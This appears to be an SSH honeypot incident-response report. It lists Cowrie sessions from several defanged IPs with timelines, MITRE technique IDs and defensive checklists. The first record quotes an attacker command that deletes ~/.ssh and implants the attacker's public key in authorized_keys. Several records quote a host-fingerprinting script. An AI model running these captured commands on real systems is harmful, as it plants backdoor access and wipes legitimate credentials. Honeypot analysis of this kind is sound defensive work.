### 🔴 HIGH · IR-f037ac666e40

| Field | Detail |
|---|---|
| **Source IP** | `5.182.83[.]231` |
| **First Seen** | 2026-09-04 04:09 |
| **Last Seen** | 2026-09-04 04:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:09:50` | `cowrie.session.connect` |
| `2026-09-04 04:09:50` | `cowrie.client.version` |
| `2026-09-04 04:09:50` | `cowrie.client.kex` |
| `2026-09-04 04:09:50` | `cowrie.login.success` |
| `2026-09-04 04:09:51` | `cowrie.session.params` |
| `2026-09-04 04:09:51` | `cowrie.command.input` |
| `2026-09-04 04:09:51` | `cowrie.command.failed` |
| `2026-09-04 04:09:51` | `cowrie.log.closed` |
| `2026-09-04 04:09:52` | `cowrie.session.params` |
| `2026-09-04 04:09:52` | `cowrie.command.input` |
| `2026-09-04 04:09:52` | `cowrie.session.file_download` |
| `2026-09-04 04:09:52` | `cowrie.log.closed` |
| `2026-09-04 04:09:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.182.83[.]231` to AbuseIPDB if not already reported
- [ ] Block `5.182.83[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce3bf7605a06

| Field | Detail |
|---|---|
| **Source IP** | `5.182.83[.]231` |
| **First Seen** | 2026-09-04 04:09 |
| **Last Seen** | 2026-09-04 04:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:09:52` | `cowrie.session.connect` |
| `2026-09-04 04:09:52` | `cowrie.client.version` |
| `2026-09-04 04:09:52` | `cowrie.client.kex` |
| `2026-09-04 04:09:53` | `cowrie.login.success` |
| `2026-09-04 04:09:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.182.83[.]231` to AbuseIPDB if not already reported
- [ ] Block `5.182.83[.]231` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdf0ea08fdb7

| Field | Detail |
|---|---|
| **Source IP** | `5.182.83[.]231` |
| **First Seen** | 2026-09-04 04:09 |
| **Last Seen** | 2026-09-04 04:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:09:53` | `cowrie.session.connect` |
| `2026-09-04 04:09:53` | `cowrie.client.version` |
| `2026-09-04 04:09:53` | `cowrie.client.kex` |
| `2026-09-04 04:09:54` | `cowrie.login.success` |
| `2026-09-04 04:09:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.182.83[.]231` to AbuseIPDB if not already reported
- [ ] Block `5.182.83[.]231` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-021089220f37

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 04:10 |
| **Last Seen** | 2026-09-04 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:10:29` | `cowrie.session.connect` |
| `2026-09-04 04:10:29` | `cowrie.client.version` |
| `2026-09-04 04:10:29` | `cowrie.client.kex` |
| `2026-09-04 04:10:30` | `cowrie.login.success` |
| `2026-09-04 04:10:30` | `cowrie.direct-tcpip.request` |
| `2026-09-04 04:10:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 04:10:30` | `cowrie.direct-tcpip.data` |
| `2026-09-04 04:10:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2ed277a1aeb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:10 |
| **Last Seen** | 2026-09-04 04:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:10:47` | `cowrie.session.connect` |
| `2026-09-04 04:10:47` | `cowrie.client.version` |
| `2026-09-04 04:10:47` | `cowrie.client.kex` |
| `2026-09-04 04:10:48` | `cowrie.login.success` |
| `2026-09-04 04:10:49` | `cowrie.session.params` |
| `2026-09-04 04:10:49` | `cowrie.command.input` |
| `2026-09-04 04:10:49` | `cowrie.command.input` |
| `2026-09-04 04:10:49` | `cowrie.command.input` |
| `2026-09-04 04:10:49` | `cowrie.command.input` |
| `2026-09-04 04:10:49` | `cowrie.command.input` |
| `2026-09-04 04:10:49` | `cowrie.command.success` |
| `2026-09-04 04:10:49` | `cowrie.command.input` |
| `2026-09-04 04:10:49` | `cowrie.command.input` |
| `2026-09-04 04:10:49` | `cowrie.command.input` |
| `2026-09-04 04:10:49` | `cowrie.command.input` |
| `2026-09-04 04:10:50` | `cowrie.log.closed` |
| `2026-09-04 04:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5b4fbf72cd9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:12 |
| **Last Seen** | 2026-09-04 04:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:12:58` | `cowrie.session.connect` |
| `2026-09-04 04:12:58` | `cowrie.client.version` |
| `2026-09-04 04:12:58` | `cowrie.client.kex` |
| `2026-09-04 04:12:59` | `cowrie.login.success` |
| `2026-09-04 04:13:00` | `cowrie.session.params` |
| `2026-09-04 04:13:00` | `cowrie.command.input` |
| `2026-09-04 04:13:00` | `cowrie.command.input` |
| `2026-09-04 04:13:00` | `cowrie.command.input` |
| `2026-09-04 04:13:00` | `cowrie.command.input` |
| `2026-09-04 04:13:00` | `cowrie.command.input` |
| `2026-09-04 04:13:00` | `cowrie.command.success` |
| `2026-09-04 04:13:00` | `cowrie.command.input` |
| `2026-09-04 04:13:00` | `cowrie.command.input` |
| `2026-09-04 04:13:00` | `cowrie.command.input` |
| `2026-09-04 04:13:00` | `cowrie.command.input` |
| `2026-09-04 04:13:01` | `cowrie.log.closed` |
| `2026-09-04 04:13:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-018844b1119e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:15 |
| **Last Seen** | 2026-09-04 04:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:15:12` | `cowrie.session.connect` |
| `2026-09-04 04:15:12` | `cowrie.client.version` |
| `2026-09-04 04:15:12` | `cowrie.client.kex` |
| `2026-09-04 04:15:13` | `cowrie.login.success` |
| `2026-09-04 04:15:14` | `cowrie.session.params` |
| `2026-09-04 04:15:14` | `cowrie.command.input` |
| `2026-09-04 04:15:14` | `cowrie.command.input` |
| `2026-09-04 04:15:14` | `cowrie.command.input` |
| `2026-09-04 04:15:14` | `cowrie.command.input` |
| `2026-09-04 04:15:14` | `cowrie.command.input` |
| `2026-09-04 04:15:14` | `cowrie.command.success` |
| `2026-09-04 04:15:14` | `cowrie.command.input` |
| `2026-09-04 04:15:14` | `cowrie.command.input` |
| `2026-09-04 04:15:14` | `cowrie.command.input` |
| `2026-09-04 04:15:14` | `cowrie.command.input` |
| `2026-09-04 04:15:15` | `cowrie.log.closed` |
| `2026-09-04 04:15:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c47758b25cd5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:19 |
| **Last Seen** | 2026-09-04 04:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:19:21` | `cowrie.session.connect` |
| `2026-09-04 04:19:22` | `cowrie.client.version` |
| `2026-09-04 04:19:22` | `cowrie.client.kex` |
| `2026-09-04 04:19:23` | `cowrie.login.success` |
| `2026-09-04 04:19:25` | `cowrie.session.params` |
| `2026-09-04 04:19:25` | `cowrie.command.input` |
| `2026-09-04 04:19:25` | `cowrie.command.input` |
| `2026-09-04 04:19:25` | `cowrie.command.input` |
| `2026-09-04 04:19:25` | `cowrie.command.input` |
| `2026-09-04 04:19:25` | `cowrie.command.input` |
| `2026-09-04 04:19:25` | `cowrie.command.success` |
| `2026-09-04 04:19:25` | `cowrie.command.input` |
| `2026-09-04 04:19:25` | `cowrie.command.input` |
| `2026-09-04 04:19:25` | `cowrie.command.input` |
| `2026-09-04 04:19:25` | `cowrie.command.input` |
| `2026-09-04 04:19:25` | `cowrie.log.closed` |
| `2026-09-04 04:19:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-871b084870af

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 04:19 |
| **Last Seen** | 2026-09-04 04:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:19:50` | `cowrie.session.connect` |
| `2026-09-04 04:19:50` | `cowrie.client.version` |
| `2026-09-04 04:19:50` | `cowrie.client.kex` |
| `2026-09-04 04:19:51` | `cowrie.login.success` |
| `2026-09-04 04:19:51` | `cowrie.direct-tcpip.request` |
| `2026-09-04 04:19:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 04:19:51` | `cowrie.direct-tcpip.data` |
| `2026-09-04 04:19:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-761e04843d4a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 04:20 |
| **Last Seen** | 2026-09-04 04:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:20:01` | `cowrie.session.connect` |
| `2026-09-04 04:20:01` | `cowrie.client.version` |
| `2026-09-04 04:20:01` | `cowrie.client.kex` |
| `2026-09-04 04:20:02` | `cowrie.login.success` |
| `2026-09-04 04:20:02` | `cowrie.direct-tcpip.request` |
| `2026-09-04 04:20:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 04:20:02` | `cowrie.direct-tcpip.data` |
| `2026-09-04 04:20:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33d28d74526f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:21 |
| **Last Seen** | 2026-09-04 04:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:21:27` | `cowrie.session.connect` |
| `2026-09-04 04:21:27` | `cowrie.client.version` |
| `2026-09-04 04:21:27` | `cowrie.client.kex` |
| `2026-09-04 04:21:28` | `cowrie.login.success` |
| `2026-09-04 04:21:30` | `cowrie.session.params` |
| `2026-09-04 04:21:30` | `cowrie.command.input` |
| `2026-09-04 04:21:30` | `cowrie.command.input` |
| `2026-09-04 04:21:30` | `cowrie.command.input` |
| `2026-09-04 04:21:30` | `cowrie.command.input` |
| `2026-09-04 04:21:30` | `cowrie.command.input` |
| `2026-09-04 04:21:30` | `cowrie.command.success` |
| `2026-09-04 04:21:30` | `cowrie.command.input` |
| `2026-09-04 04:21:30` | `cowrie.command.input` |
| `2026-09-04 04:21:30` | `cowrie.command.input` |
| `2026-09-04 04:21:30` | `cowrie.command.input` |
| `2026-09-04 04:21:30` | `cowrie.log.closed` |
| `2026-09-04 04:21:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29d5e71ce934

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:23 |
| **Last Seen** | 2026-09-04 04:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:23:26` | `cowrie.session.connect` |
| `2026-09-04 04:23:26` | `cowrie.client.version` |
| `2026-09-04 04:23:26` | `cowrie.client.kex` |
| `2026-09-04 04:23:28` | `cowrie.login.success` |
| `2026-09-04 04:23:29` | `cowrie.session.params` |
| `2026-09-04 04:23:29` | `cowrie.command.input` |
| `2026-09-04 04:23:29` | `cowrie.command.input` |
| `2026-09-04 04:23:29` | `cowrie.command.input` |
| `2026-09-04 04:23:29` | `cowrie.command.input` |
| `2026-09-04 04:23:29` | `cowrie.command.input` |
| `2026-09-04 04:23:29` | `cowrie.command.success` |
| `2026-09-04 04:23:29` | `cowrie.command.input` |
| `2026-09-04 04:23:29` | `cowrie.command.input` |
| `2026-09-04 04:23:29` | `cowrie.command.input` |
| `2026-09-04 04:23:29` | `cowrie.command.input` |
| `2026-09-04 04:23:29` | `cowrie.log.closed` |
| `2026-09-04 04:23:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e86d41d1bc13

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:25 |
| **Last Seen** | 2026-09-04 04:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:25:38` | `cowrie.session.connect` |
| `2026-09-04 04:25:38` | `cowrie.client.version` |
| `2026-09-04 04:25:38` | `cowrie.client.kex` |
| `2026-09-04 04:25:38` | `cowrie.login.success` |
| `2026-09-04 04:25:40` | `cowrie.session.params` |
| `2026-09-04 04:25:40` | `cowrie.command.input` |
| `2026-09-04 04:25:40` | `cowrie.command.input` |
| `2026-09-04 04:25:40` | `cowrie.command.input` |
| `2026-09-04 04:25:40` | `cowrie.command.input` |
| `2026-09-04 04:25:40` | `cowrie.command.input` |
| `2026-09-04 04:25:40` | `cowrie.command.success` |
| `2026-09-04 04:25:40` | `cowrie.command.input` |
| `2026-09-04 04:25:40` | `cowrie.command.input` |
| `2026-09-04 04:25:40` | `cowrie.command.input` |
| `2026-09-04 04:25:40` | `cowrie.command.input` |
| `2026-09-04 04:25:40` | `cowrie.log.closed` |
| `2026-09-04 04:25:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fd071cf01ed

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:28 |
| **Last Seen** | 2026-09-04 04:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:28:20` | `cowrie.session.connect` |
| `2026-09-04 04:28:20` | `cowrie.client.version` |
| `2026-09-04 04:28:20` | `cowrie.client.kex` |
| `2026-09-04 04:28:21` | `cowrie.login.success` |
| `2026-09-04 04:28:22` | `cowrie.session.params` |
| `2026-09-04 04:28:22` | `cowrie.command.input` |
| `2026-09-04 04:28:22` | `cowrie.command.input` |
| `2026-09-04 04:28:22` | `cowrie.command.input` |
| `2026-09-04 04:28:22` | `cowrie.command.input` |
| `2026-09-04 04:28:22` | `cowrie.command.input` |
| `2026-09-04 04:28:22` | `cowrie.command.success` |
| `2026-09-04 04:28:22` | `cowrie.command.input` |
| `2026-09-04 04:28:22` | `cowrie.command.input` |
| `2026-09-04 04:28:22` | `cowrie.command.input` |
| `2026-09-04 04:28:22` | `cowrie.command.input` |
| `2026-09-04 04:28:23` | `cowrie.log.closed` |
| `2026-09-04 04:28:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af3eaa767d4f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 04:29 |
| **Last Seen** | 2026-09-04 04:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:29:24` | `cowrie.session.connect` |
| `2026-09-04 04:29:24` | `cowrie.client.version` |
| `2026-09-04 04:29:24` | `cowrie.client.kex` |
| `2026-09-04 04:29:25` | `cowrie.login.success` |
| `2026-09-04 04:29:25` | `cowrie.direct-tcpip.request` |
| `2026-09-04 04:29:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 04:29:25` | `cowrie.direct-tcpip.data` |
| `2026-09-04 04:29:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a69ec83f777d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 04:30 |
| **Last Seen** | 2026-09-04 04:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
